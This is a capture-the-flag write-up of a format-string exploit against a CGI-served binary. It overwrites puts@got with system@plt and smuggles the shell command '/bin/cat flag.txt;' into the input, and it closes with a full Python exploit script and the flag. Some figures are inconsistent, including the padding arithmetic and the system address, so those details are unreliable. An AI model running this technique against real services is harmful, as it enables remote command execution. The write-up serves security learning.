## C is Easy - PWN
* Author : mir.ai
* Point : 497
* Difficulity : very hard
* Status : Upsolved
* Solved By : Eclair
---

#### Description
*it's just dasprog all over again*

#### Analysis
At first, as usual I'll check file description using `file ./chall`.<br>
I found the file is stripped.<br>
<br>
<img width="1495" height="67" alt="image" src="https://github.com/user-attachments/assets/26f9c06f-3ab4-4c87-bb7d-a729f0f67af5" /><br>
<br>
So, I check the `pseucode-C` in Ghidra.<br>
<br>
<img width="655" height="651" alt="image" src="https://github.com/user-attachments/assets/da0a24eb-b163-49a8-ae31-978d32c88a4f" /><br>
<br>
From the image above, I spotted the vulnerabilites immediately, `format string attack`, yep, that's it, at that point, I already thought about the execution, but first thing to say, I forget to attach about file protection.<br>
So, after checked the file protection, we got<br>
| Protection | Status |
| :--: | :--: |
| RELRO | Partial RELRO |
| Canary | No Canary Found |
| NX | NX Enable |
| PIE | No PIE `(0x3fe000)` |

So, from that information, we know only `NX Protection` that's enable, so we can't execute our shellcode in stack.<br>
Let me continue about my execution flow, so first thing that crossed in my mind is I will leak the libc base address trought `format string attack` and then overflow it to call `system` to get shell.<br>
But, I realize I have no `buffer overflow` vulnerabilities since the lenght of out input was well-prepared.<br>
<br>
<img width="197" height="31" alt="image" src="https://github.com/user-attachments/assets/435eaa4e-69cc-4bf0-84a8-2068bccfb36e" /><br>
<br>
<img width="621" height="122" alt="image" src="https://github.com/user-attachments/assets/09c92e09-0eb1-40ce-be05-c7bd98cacd8d" /><br>
<br>
But, let's look closely, we have `format string attack` and after that vulnerabilities or `printf(local_38)` we also call `puts` function with argument from our input, wow, sounds interesting.<br>
What if we overwrite `puts@got` (since the protection allow it us) to `system@plt` so instead we called `puts` function, we just called `system` function and for the `/bin/sh` strings, it's from our input, so it's gonna work.<br>
Hold on, but as we know, `puts` function also take argument from our input which is from `local_38` whereas, our input already used for `GOT Overwrite`.<br>
Then I did some research to overcome it, after several minutes, I got the idea, actually, we can separate two input with `;` or semicolon so the idea is the first byte our payload will be `/bin/sh` and then next it would be out payload to overwrite `puts@got` into `system@plt`.<br>
so the full input would be like this `/bin/sh; (thing to overwrite)`.<br>
But, this payload raise another problem, we can't use `fmtstr_payload` from `pwntools`, we should did it manually, that's what I thought, so I did it manually.<br>
<br>
And then, I remember, how do I put my input, after I check `Dockerfile`.<br>
<br>
<img width="1480" height="443" alt="image" src="https://github.com/user-attachments/assets/d02cece4-efb6-4626-9f2f-02e4faf7ab36" /><br>
<br>
It's using CGI for the challenge, so I have to send my input trought web request POST method based and it also changing my payload from `/bin/sh; + <thing to overwrite>` into `/bin/cat flag.txt; + <thing to overwrite>`.<br>
Okey that's perfect.<br>

#### Exploit
Okey, first thing that I will prepare is `system@plt` and `puts@got` address.<br>
* `system@plt` : `0x4010d4`
* `puts@got` : `0x404008`<br>
<br>

Okey, we already got the address that we needed, next we have to check the value of `puts@got` to determine how many byte that we need to change to make it into `system@plt` address.<br>
<br>

```console
pwndbg> x/gx 0x404008
0x404008 <puts@got.plt>:        0x0000000000401040
```
<br>

Okey, we got the value of `puts@got` address and it has no big difference with `system@plt` address, only LSB last byte that different, so we just need partial overwrite to `puts@got` from `0x401040` to `0c4010d4` or `0x40` -> `0xd4`.<br>
Okey, so I will set the payload for `GOT Overwrite`.<br>
<br>

> Disclaimer<br>
> I actually change last `2 byte`, so it mean `0x1040` -> `0x10d4` I know, it's wasting byte, but yeah, dunno why I choose this way
<br>

```text
%4038c%10$hn + p64(0x404008)
```
<br>

Okey, I'll explain, `%403bc` mean we will print out 4038 characters, and `%hn` will read 4038 character and store it in `0x404008` as `0x10d4` and we already overwrite it.<br>
And for those who ask why I put the address behinde the payload `%4038c%10$hn` because `p64(0x404008)` resulting `\x00` which mean printf will stop execute the code that's why I put it in the last payload.<br>
But don't forget we need `/bin/cat flag.txt;` in the first byte of our input for `puts(local_38)`.<br>
<br>

```text
/bin/cat flag.txt;# %4038c%10$hn + p64(0x404008)
```
<br>

But, we need recalibrate our payload, because `%hn` read from first byte of our input, so it's not longer `%4038c` becayse in the first we alreayd added `/bin/cat flag.txt;` so if we calculate it `/bin/cat flag.txt;# ` is `20 bytes` so it mean `4038 - 20 = `4288`.<br>
<br>

```text
/bin/cat flag.txt;# %4288c%10$hn + p64(x404008)
```
<br>

But, there is other problem, we need make it allignment `0x08`, why? because if we didn't make it, `p64(0x404008)` will mixed with another values, so we need make it allignment.<br>
<br>

`/bin/cat flag.txt;# %4288c%10$hn` is `32 byte` allign with `0x8`, what a lucn.<br>

And for those why it's `%10` or in offset 10, because `printf` if takes argument from stack it will start in `rsp` (mostly, not always I guess) and it was in index 6, why? because index 1 - 5 was used by `register argument` (in x86_64) it was `rsi, rdx, rcx, r8, and r9` where is `rdi` it was used for address or entry gate so it's not counted.<br>
So, we know after `r9` we will take from the stack, and was started from 6 and how do I get offset 10. it's simple, because printf always take `8 byte` full from the stack, that's why we need `0x08` allignment, let's count.<br>

* `/bin/cat` = `8 byte` -> `index 6`<br>
* ` flag.tx` = `8 byte` -> `index 7` (don't forget whitespace counter)<br>
* `t;# %428` = `8 byte` -> `index 8`<br>
* `8c%10$hn` = `8 byte` -> `index 9`<br>
* `p64(0x404008)` = `8 byte` -> `index 10`<br>
<br>

As you can see, our address is at `offset 10` that's why it's `%10$hn`.<br>

#### Payload
Here's my full payload.<br>

```python
import requests
from pwn import *
import http.client
import socket

elf = context.binary = ELF('./chall')

url = 'http://10.28.78.199:30794/cgi-bin/chall'
#url = 'http://localhost:8080/cgi-bin/chall'

system = 0x404018 #elf.plt['system']
puts = 0x404008 #elf.got['puts']

payload = b'/bin/cat /flag.*;  #' + b'%4288c%10$hn' + p64(0x404008)

request = (
    b"POST /cgi-bin/chall HTTP/1.1\r\n"
    b"Host: http://10.28.78.199:30713\r\n"
    b"Content-Length: 40\r\n"
    b"Content-Type: application/octet-stream\r\n"
    b"Connection: close\r\n"
    b"\r\n"
    + payload
)

print(len(payload))

with open('payload.bin', 'wb') as f:
    f.write(payload)

with socket.create_connection(("10.28.78.199", 30713)) as s:
    s.sendall(request)
    s.shutdown(socket.SHUT_WR)
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk

print(resp.decode(errors="replace"))
```
<br>
And for the flag is.<br>
<br>

`QUAD26{i need to sleep so bad_83dfdf32ca}`




